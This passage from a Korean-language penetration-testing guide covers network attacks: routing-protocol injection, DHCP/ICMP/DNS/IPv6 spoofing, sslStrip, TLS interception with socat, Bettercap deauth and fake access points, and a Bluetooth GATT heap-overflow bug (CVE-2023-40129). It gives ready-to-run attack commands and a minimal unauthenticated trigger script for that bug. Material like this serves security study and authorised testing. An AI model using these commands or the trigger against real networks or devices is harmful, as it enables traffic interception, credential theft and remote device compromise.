- hub 또는 유사 장치를 사용해 인증할 때 악성 네트워크 트래픽을 주입

공격자가 피해자와 인증 서버 사이에 위치해 있다면, 필요에 따라 인증 프로토콜을 EAP-MD5로 강제로 약화시켜 인증 시도를 캡처할 수 있습니다. 그런 다음, 다음을 사용해 이를 brute-force할 수 있습니다:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) 공격 <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol)은 핫 중복 라우팅 시스템을 생성하도록 설계된 네트워크 프로토콜 계열입니다. FHRP를 사용하면 물리적 라우터를 단일 논리 장치로 결합할 수 있어 장애 허용성이 향상되고 부하 분산에 도움이 됩니다.

**Cisco Systems 엔지니어들은 GLBP와 HSRP라는 두 가지 FHRP 프로토콜을 개발했습니다.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Routing Information Protocol (RIP)에는 RIP, RIPv2, RIPng의 세 가지 버전이 존재합니다. RIP와 RIPv2는 UDP 포트 520을 통해 피어에게 데이터그램을 전송하고, RIPng는 IPv6 멀티캐스트를 통해 UDP 포트 521로 데이터그램을 브로드캐스트합니다. RIPv2는 MD5 인증을 지원하도록 도입되었으며, 반면 RIPng는 네이티브 인증을 포함하지 않고 대신 IPv6에서 선택적 IPsec AH 및 ESP 헤더에 의존합니다.

- **RIP and RIPv2:** 통신은 포트 520의 UDP 데이터그램을 통해 이루어집니다.
- **RIPng:** IPv6 멀티캐스트를 통해 UDP 포트 521로 데이터그램을 브로드캐스트합니다.

RIPv2가 MD5 인증을 지원하는 반면 RIPng는 네이티브 인증을 포함하지 않고 IPv6의 IPsec AH 및 ESP 헤더에 의존한다는 점을 유의하세요.

### EIGRP 공격

**EIGRP (Enhanced Interior Gateway Routing Protocol)**는 동적 라우팅 프로토콜입니다. **거리 벡터 프로토콜**입니다. 인증과 수동 인터페이스 설정이 없으면 **공격자**가 EIGRP 라우팅을 교란하여 **라우팅 테이블 오염(routing table poisoning)**을 일으킬 수 있습니다. 또한 EIGRP 네트워크(즉, autonomous system)는 **평면 구조로 구분 영역이 없습니다**. 공격자가 **경로를 주입(inject)**하면 이 경로는 EIGRP 자율 시스템 전체에 **전파될 가능성이 높습니다**.

EIGRP 시스템을 공격하려면 **정상적인 EIGRP 라우터와 이웃(neighbourhood) 관계를 수립**해야 하며, 이는 기본적인 정찰부터 다양한 주입 공격에 이르기까지 많은 가능성을 열어줍니다.

[**FRRouting**](https://frrouting.org/)을 사용하면 BGP, OSPF, EIGRP, RIP 등 여러 프로토콜을 지원하는 **가상 라우터를 구현**할 수 있습니다. 공격자 시스템에 이를 배포하기만 하면 라우팅 도메인에서 합법적인 라우터인 척할 수 있습니다.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/)는 EIGRP 브로드캐스트를 가로채는 기능을 제공합니다. 또한 패킷 주입을 허용하여 라우팅 구성을 변경하는 데 사용할 수 있습니다.

### OSPF

Open Shortest Path First (OSPF) 프로토콜에서는 라우터 간 보안 통신을 위해 **MD5 인증이 일반적으로 사용됩니다**. 그러나 Loki나 John the Ripper 같은 도구를 사용하면 이 보안 수단을 무력화할 수 있습니다. 이러한 도구는 MD5 해시를 캡처하고 크랙할 수 있어 인증 키를 노출시킵니다. 일단 이 키를 얻으면 새로운 라우팅 정보를 주입할 수 있습니다. 경로 매개변수를 구성하고 탈취된 키를 설정하려면 각각 _Injection_ 및 _Connection_ 탭을 사용합니다.

- **MD5 해시 캡처 및 크래킹:** Loki, John the Ripper 등의 도구를 사용합니다.
- **경로 매개변수 구성:** _Injection_ 탭을 통해 수행됩니다.
- **탈취된 키 설정:** _Connection_ 탭에서 키를 설정합니다.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): 네트워크 트래픽을 스캔하고 취약점을 찾는 도구
- 네트워크 공격에 대한 **추가 정보**는 [**여기**](https://github.com/Sab0tag3d/MITM-cheatsheet)에서 확인할 수 있습니다.

## **Spoofing**

공격자는 가짜 DHCP 응답을 보내 네트워크의 신규 구성원의 모든 네트워크 매개변수(GW, IP, DNS)를 설정합니다.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Check the [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect는 공격자가 특정 IP에 도달하는 최적 경로임을 알리는 ICMP 패킷(type 1, code 5)을 전송하는 것입니다. 그 후 피해자가 해당 IP에 접속하려 할 때 패킷을 공격자를 통해 전송하게 됩니다.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

attacker는 victim이 요청한 일부(또는 모든) domains를 resolve합니다.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq로 자체 DNS 구성**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### 로컬 게이트웨이

시스템과 네트워크로 가는 경로가 여러 개 존재하는 경우가 많다. 로컬 네트워크 내의 MAC addresses 목록을 만든 후, _gateway-finder.py_를 사용해 IPv4 포워딩을 지원하는 호스트를 식별하라.

<details>
<summary>gateway-finder 사용 예시</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNS 조회가 실패할 때 로컬 호스트 해석을 위해 Microsoft 시스템은 **Link-Local Multicast Name Resolution (LLMNR)** 및 **NetBIOS Name Service (NBT-NS)**에 의존합니다. 마찬가지로 **Apple Bonjour**와 **Linux zero-configuration** 구현은 네트워크 내 시스템을 발견하기 위해 **Multicast DNS (mDNS)**를 사용합니다. 이러한 프로토콜들은 인증되지 않은 특성과 UDP를 통한 브로드캐스트 메시지 전송 방식 때문에, 사용자를 악성 서비스로 리디렉션하려는 공격자에 의해 악용될 수 있습니다.

Responder를 사용하여 호스트가 찾는 서비스를 가장해 가짜 응답을 보낼 수 있습니다.\
자세한 내용은 [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)에서 확인하세요.

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

브라우저는 일반적으로 **Web Proxy Auto-Discovery (WPAD) protocol to automatically acquire proxy settings**를 사용해 프록시 설정을 자동으로 획득합니다. 이는 예를 들어 "http://wpad.example.org/wpad.dat"와 같은 URL을 통해 서버에서 구성 세부 정보를 가져오는 것을 포함합니다. 클라이언트가 이 서버를 발견하는 방법은 여러 메커니즘을 통해 이루어질 수 있습니다:

- **DHCP**를 통해, 특수 코드 252 항목을 사용하여 발견이 용이해집니다.
- **DNS**를 통해, 로컬 도메인 내에서 _wpad_라는 호스트명을 검색합니다.
- **Microsoft LLMNR 및 NBT-NS**를 통해, DNS 조회가 실패할 경우의 폴백 메커니즘으로 사용됩니다.

도구 Responder는 이 프로토콜을 악용해 **malicious WPAD server**로 동작합니다. DHCP, DNS, LLMNR 및 NBT-NS를 사용해 클라이언트를 속여 자신에게 연결하게 만듭니다. Responder로 서비스를 가장하는 방법에 대해 더 깊이 알고 싶다면 [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)을 참조하세요.

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

네트워크에서 다양한 서비스를 제공해 사용자를 속여 **평문 자격증명(plain-text credentials)**을 입력하게 만들 수 있습니다. 이 공격에 대한 자세한 정보는 [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)에서 확인하세요.

### IPv6 Neighbor Spoofing

이 공격은 ARP Spoofing과 매우 유사하지만 IPv6 환경에서 발생합니다. 피해자로 하여금 GW의 IPv6 주소가 공격자의 MAC을 가지고 있다고 믿게 만들 수 있습니다.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

일부 OS는 네트워크에서 전송되는 RA 패킷을 통해 게이트웨이를 기본적으로 구성합니다. 공격자를 IPv6 router로 선언하려면 다음을 사용할 수 있습니다:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

기본적으로 일부 OS는 네트워크에서 DHCPv6 패킷을 읽어 DNS를 구성하려고 시도합니다. 따라서 공격자는 자신을 DNS로 설정하도록 DHCPv6 패킷을 보낼 수 있습니다. DHCP는 또한 피해자에게 IPv6 주소를 제공합니다.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (가짜 페이지 및 JS 코드 인젝션)

## 인터넷 공격

### sslStrip

기본적으로 이 공격은 **user**가 **HTTPS** 버전으로 **redirecting**되는 **HTTP** 페이지에 **access**하려고 할 때 발생합니다. **sslStrip**은 **HTTP connection with** the **client and** a **HTTPS connection with** the **server**를 **maintain**함으로써 연결을 **plain text**로 **sniff**할 수 있게 합니다.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
자세한 정보는 [여기](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy를 사용한 HSTS 우회

**sslStrip+ and dns2proxy**와 **sslStrip**의 **차이점**은 예를 들어 _**www.facebook.com**_을 _**wwww.facebook.com**_으로(추가된 "**w**"에 주목) **리다이렉트**하고 해당 도메인의 **주소를 공격자 IP로 설정**한다는 점입니다. 이렇게 하면 **클라이언트**는 _**wwww.facebook.com**_(**공격자**)에 **연결**하지만 내부적으로 **sslstrip+**는 **www.facebook.com**과의 실제 https 연결을 **유지**합니다.

이 기술의 **목표**는 **HSTS를 회피**하는 것입니다. _**wwww.facebook.com**_은 브라우저의 **캐시**에 저장되지 않기 때문에 브라우저는 **facebook 인증을 HTTP로 수행하도록 속게** 됩니다.\  
이 공격을 수행하려면 피해자가 처음에 [http://www.faceook.com](http://www.faceook.com)으로 접속을 시도해야 하며 https가 아니어야 합니다. 이는 http 페이지 내부의 링크를 수정하여 수행할 수 있습니다.

자세한 내용은 [여기](https://www.bettercap.org/legacy/#hsts-bypass), [여기](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) 및 [여기](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)을 참조하세요.

**sslStrip or sslStrip+는 더 이상 작동하지 않습니다.** 이는 브라우저에 사전 저장된 HSTS 규칙들이 있기 때문이며, 따라서 사용자가 "중요한" 도메인에 처음 접근하더라도 HTTPS로 접근하게 됩니다. 또한 사전 저장된 규칙과 생성된 다른 규칙들은 [**`includeSubdomains`**](https://hstspreload.appspot.com) 플래그를 사용할 수 있으므로 이전의 _**wwww.facebook.com**_ 예시는 더 이상 작동하지 않습니다. _**facebook.com**_은 `includeSubdomains`와 함께 HSTS를 사용합니다.

TODO: easy-creds, evilgrade, metasploit, factory

## TCP 포트에서 리스닝
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL 포트에서 수신(listen)

#### 키 및 self-signed certificate 생성
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 인증서를 사용하여 리스닝
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 인증서를 사용해 수신 대기하고 호스트로 리다이렉트
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
가끔, 클라이언트가 CA가 유효한지 확인하면, **CA로 서명된 다른 hostname의 certificate를 제공할 수 있습니다**.\
또 다른 흥미로운 테스트는 **요청된 hostname의 certificate를 self-signed로 제공하는 것**입니다.

다른 테스트로는 유효하지만 CA가 아닌 certificate로 해당 certificate에 서명하려고 시도하는 것입니다. 또는 유효한 public key를 사용해 diffie hellman 같은(실제 private key로 아무것도 복호화할 필요가 없는) 알고리즘을 강제 적용한 뒤, 클라이언트가 실제 private key의 probe(예: hash)를 요청할 때 가짜 probe를 보내고 클라이언트가 이를 검사하지 않는지 확인하는 방법이 있습니다.

## Bettercap

<details>
<summary>일반적인 Bettercap 명령</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### 활성 탐지 노트

UDP 패킷을 요청된 포트를 갖고 있지 않은 장치로 보낼 경우 ICMP (Port Unreachable)가 전송된다는 점을 고려하라.

### **ARP discover**

ARP 패킷은 네트워크 내에서 어떤 IP들이 사용 중인지 발견하는 데 사용된다. PC는 가능한 각 IP 주소에 대해 요청을 보내야 하며 사용 중인 주소만 응답한다.

### **mDNS (multicast DNS)**

Bettercap은 MDNS 요청을 (각 X ms마다) 보내 **\_services\_.dns-sd.\_udp.local** 를 질의한다. 이 패킷을 받은 머신은 보통 이 요청에 응답한다. 그런 다음 'services'에 응답하는 머신만 검색한다.

**도구**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap은 137/UDP 포트로 브로드캐스트 패킷을 보내 "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA"라는 이름을 요청한다.

### **SSDP (Simple Service Discovery Protocol)**

Bettercap은 모든 종류의 서비스를 찾기 위해 SSDP 패킷을 브로드캐스트한다 (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap은 서비스를 찾기 위해 WSD 패킷을 브로드캐스트한다 (UDP Port 3702).


## Bluetooth (L2CAP/ATT/GATT) 공격

- Android Fluoride는 L2CAP PSMs를 통해 서비스를 노출한다 (e.g., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). 서비스는 다음을 통해 등록된다:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- BlueBlue framework는 Scapy-based L2CAP/ATT crafting을 가능하게 합니다 (built on BlueBorne l2cap_infra). 예:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): Read Multiple Variable response builder에서의 integer underflow로 인해, MTU가 variable-length element를 truncates하고 +2 length field가 고려되지 않을 경우 약 ~64KB의 heap overflow가 발생할 수 있습니다.

<details>
<summary>근본 원인 (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- 가변 길이 항목에서는 overflow 경로가 (total_len - mtu)만 빼고 +2 length field를 무시하므로 len이 underflow(예: 0xFFFE)하여 memcpy가 버퍼 끝에서 약 ~64KB를 초과해 기록됩니다.
</details>

- 인증 없이 작동하는 최소 트리거 (작은 MTU가 4번째 attribute에서 underflow를 유발):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### 통신 / 모바일 코어 (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## 참고 자료

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
